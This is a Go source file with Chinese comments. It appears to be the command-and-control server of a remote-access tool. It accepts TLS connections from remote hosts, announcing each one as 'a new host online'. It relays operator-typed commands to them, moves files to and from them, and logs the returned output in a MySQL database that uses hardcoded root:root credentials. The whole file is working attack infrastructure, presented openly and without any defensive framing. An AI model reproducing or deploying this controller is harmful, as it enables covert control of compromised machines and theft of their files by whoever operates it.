//这个文件在windows上运行

package main

import (
	"bufio"
	"crypto/tls"
	"crypto/x509"
	"database/sql"
	"fmt"
	_ "github.com/go-sql-driver/mysql"
	"io"
	"io/ioutil"
	"mahonia"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"time"
)

var listener net.Listener
var db *sql.DB //声明一个全局的db变量
var conn net.Conn
var  wg sync.WaitGroup //声明一个计时器

// InitMysql 初始化数据库和尝试连接数据库
func InitMysql() (err error) {
	innodb := "root:root@tcp(127.0.0.1:3306)/select_information"
	db, err = sql.Open("mysql", innodb)
	if err != nil {
		return
	}
	err = db.Ping()
	if err != nil {
		return
	}
	return
}

// InsertNewDemo 在数据库中对数据库执行增删查改的操作
func InsertNewDemo() {
	for {

		fmt.Print("请输入sql语句！\n")
		instruction := bufio.NewReader(os.Stdin)
		m, _ := instruction.ReadString('\n')
		instruct := strings.Trim(m, "\n")
		if strings.Compare(instruct, "z") == 1 {
			return
		}
		_, err := db.Exec(instruct)
		if err != nil {
			fmt.Print("insert information err:", err)
		} else {
			fmt.Print("insert information success!\n")
		}
	}
}

//主函数
func main() {
	addr := "0.0.0.0:4344"
	//监听本机端口
	listener, _ = tls.Listen("tcp", addr, encryption()) //tls.Listen("tcp", addr,encryption())
	//net.Listen("tcp", "10.0.16.14:4445")
	listeners()

}

//等待客户端连接
func listeners() {

	fmt.Println("listen success!")
	//等待连接
	for {
		wg.Add(1)
		fmt.Println("waiting connection!")
		conn, _ = listener.Accept() //没有收到连接请求就一直堵塞
		fmt.Println("叮，您有新的主机上线啦！")
		fmt.Print("主机ip为：", conn.RemoteAddr(), "\n")
		fmt.Print("开始通信的时间为：", time.Now().Format("2006-01-02 15:04:05"))
		fmt.Print("\n")
		go selection() //接收数据返回接受无误 进入下一个函数选择需要做的操作
		wg.Wait()
	}
}

//选择操作(上传下载文件和执行cmd命令)
func selection() {
	for {
		//downfile向远程主机传输文件
		fmt.Print("downfile,向远程主机传输文件；\n")
		//upfile从远程主机下载文件
		fmt.Print("upfile,从远程主机下载文件；\n")
		//cmd执行cmd命令
		fmt.Print("cmd,执行其他命令；\n")
		fmt.Print("heartbeat,开启心跳功能；\n")
		fmt.Print("quit,退出连接！\n")
		fmt.Println("请输入要执行的操作：")
		input := bufio.NewReader(os.Stdin)
		s, _ := input.ReadString('\n')
		s = strings.Trim(s, "\r\n")
		if s == "downfile" {
			_, _ = conn.Write([]byte(s))
			SendFile()
		} else if s == "upfile" {
			_, _ = conn.Write([]byte(s))
			ReceiveFile()
		} else if s == "cmd" {
			_, _ = conn.Write([]byte(s))
			process()
		} else if s == "quit" {
			_, _ = conn.Write([]byte(s))
			_ = conn.Close()
			return
		} else if s == "heartbeat" {
			go keepAlive()
			fmt.Print("心跳功能开启成功！\n")
			wg.Wait()
			_=conn.Close()
			wg.Add(1)
			wg.Done()
			runtime.Goexit()
		} else {
			fmt.Print("请重新输入需要执行的操作！\n")
		}

	}
}

//从客户端读取执行cmd命令返回的结果
func process() {
	//连接数据库
	err := InitMysql()
	if err != nil {
		fmt.Print("数据库连接失败：", err,"\n")
	} else {
		fmt.Print("数据库连接成功！\n")
	}
	defer db.Close()
	for {
		//向客户端发送指令
		fmt.Print("请输入指令：\n")
		input := bufio.NewReader(os.Stdin)
		s, _ := input.ReadString('\n')
		s = strings.Trim(s, "\r\n")
		//判断是否退出该函数
		if s == "quit" {
			return
		}
		_, err1 := conn.Write([]byte(s))
		if err1 != nil {
			fmt.Print("Write Error:", err1,"\n")
		}
		//获取客户端返回的结果
		reader := bufio.NewReader(conn) //读取conn中的对象
		var buf = [512]byte{}
		n, err := reader.Read(buf[:]) //使用reader中read方法读取数据
		if err != nil {
			fmt.Print("read from conn failed,err:", err,"\n")
		}
		rec := string(buf[:n])
		rec = ConvertToString(rec, "gbk", "utf-8")
		fmt.Print("客户端传过来的结果为：", rec,"\n")
		fmt.Print("是否将结果存储进数据库?(yes or no)\n")
		m := bufio.NewReader(os.Stdin)
		result, err4 := m.ReadString('\n')
		finally := strings.Trim(result, "\r\n")
		if err4 != nil {
			fmt.Print("(yes or no err):", err4)
		}
		if finally == "yes" {
			InsertNewDemo()
		}
	}
}

// ConvertToString 转换编码
func ConvertToString(src string, srcCode string, tagCode string) string {
	srcCoder := mahonia.NewDecoder(srcCode)
	srcResult := srcCoder.ConvertString(src)
	tagCoder := mahonia.NewDecoder(tagCode)
	_, cdata, _ := tagCoder.Translate([]byte(srcResult), true)
	result := string(cdata)
	return result
}

//实现监测客户端存活功能
func keepAlive() {
	buf := make([]byte, 4096)
	var i = 0
	for {
		//空闲时间10秒
		time.Sleep(10 * time.Second)
		for {
			_, err1 := conn.Read(buf)
			if err1 != nil {
				//重连间隔5秒
				time.Sleep(5 * time.Second)
				i += 1
			}
			//重连次数为3
			if i == 3 {
				fmt.Print("啊偶，主机掉线啦！\n")
				wg.Done()
				//退出该协程
				runtime.Goexit()
			}
		}
	}
}

//实现通信加密
func encryption() *tls.Config {
	//通过私钥和证书得到crt变量
	crt, err := tls.LoadX509KeyPair("server.pem", "server.key")
	if err != nil {
		fmt.Println("err:", err)
		return nil
	}
	//从client.pem读取内容并将其赋值给certbytes变量
	certBytes, err1 := ioutil.ReadFile("client.pem")
	if err1 != nil {
		fmt.Println("Unable to read cert.pem")
		return nil
	}
	//定义clientCertPool为一个空的certpool结构体
	clientCertPool := x509.NewCertPool()
	//调用clientCertPool的AppendCertsFromPEM方法来判断client.pem证书是否有效
	ok := clientCertPool.AppendCertsFromPEM(certBytes)
	if !ok {
		fmt.Println("failed to parse root certificate")
		return nil
	}
	//生成tls.Config对象
	config := &tls.Config{
		//证书crt
		Certificates: []tls.Certificate{crt},
		//验证客户端
		ClientAuth: tls.RequestClientCert,
		ClientCAs:  clientCertPool,
	}
	return config
}

// ReceiveFile 从客户端下载文件
func ReceiveFile() {
	fmt.Print("请输入文件在主机的路径：\n")
	instruction := bufio.NewReader(os.Stdin)
	m, _ := instruction.ReadString('\n')
	_, err0 := conn.Write([]byte(m))
	if err0 != nil {
		fmt.Print("transact filepath err:", err0)
	}
	buf := make([]byte, 4096)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("conn.Read err:", err)
		return
	}
	filename := string(buf[:n])
	fmt.Println("filename:", filename)
	if filename != "" {
		fmt.Print("接收到了文件名啦！\n")
	} else {
		return
	}
	/**
	  创建文件并写入文件内容
	*/
	fmt.Println(filename)
	file, err := os.Create(filename)
	if err != nil {
		fmt.Println("os.Create err:", err)
		return
	}

	for {
		fmt.Print("开始下载文件！\n")
		n, err := conn.Read(buf)
		if err != nil {
				fmt.Println("conn.Read err:", err)
				return
		}
		s := string(buf[:n])
		s = strings.Trim(s, "\r\n")
		fmt.Print(s + "\n")
		if s =="0"  {
			fmt.Print("传输完成！\n")
			_ = file.Close()
			return
		}
		_, _ = file.Write(buf[:n])
	}
}

// SendFile 向客户端上传文件
func SendFile() {
	fmt.Print("请输入文件在主机的路径：\n")
	instruction := bufio.NewReader(os.Stdin)
	m, _ := instruction.ReadString('\n')
	FilePath := strings.Trim(m, "\r\n")
	//查看文件属性
	FileInfo, err1 := os.Stat(FilePath)
	if err1 != nil {
		fmt.Print("os.stat err:", err1)
		return
	}
	//得到文件大小
	FileConTan := FileInfo.Size()
	fmt.Print(FileConTan, "\n")
	fmt.Print("开始传输\n")
	//得到文件名
	FileName := FileInfo.Name()
	//得到文件大小
	//FileCon := strconv.FormatInt(FileConTan, 10)
	////发送文件大小给远程主机
	//_, _ = conn.Write([]byte(FileCon))
	//发送文件名大小，文件名到远程主机
	_, err2 := conn.Write([]byte(FileName))
	if err2 != nil {
		fmt.Println("conn.write err:", err2)
		return
	}
	time.Sleep(1 * time.Second)
	fmt.Print("开始读取文件内容！")
	//打开目标文件
	file, err4 := os.Open(FilePath)
	if err4 != nil {
		fmt.Print("os.open err:", err4)
		return
	}
	translation := make([]byte, 4096)
	//循环传输文件
	for {
		//从文件中读取数据
		fmt.Print("111\n")
		ReadLength, err5 := file.Read(translation)
		if err5 != nil {
			//判断是否读完了
			if err5 == io.EOF {
				fmt.Print("文件读取完成！\n")
				_, err := conn.Write([]byte("yes"))
				fmt.Print("空字节发送完成！")
				if err != nil {
					fmt.Print("nil err:", err)
				}
				_ = file.Close()
				return
			}
		}
		//向远程主机发送数据
		fmt.Print("开始传输数据！\n")
		_, err6 := conn.Write(translation[:ReadLength])
		if err6 != nil {
			fmt.Print("conn write err:", err6)
			return
		}
		fmt.Print("休息一秒！\n")
		time.Sleep(1 * time.Second)
	}
}
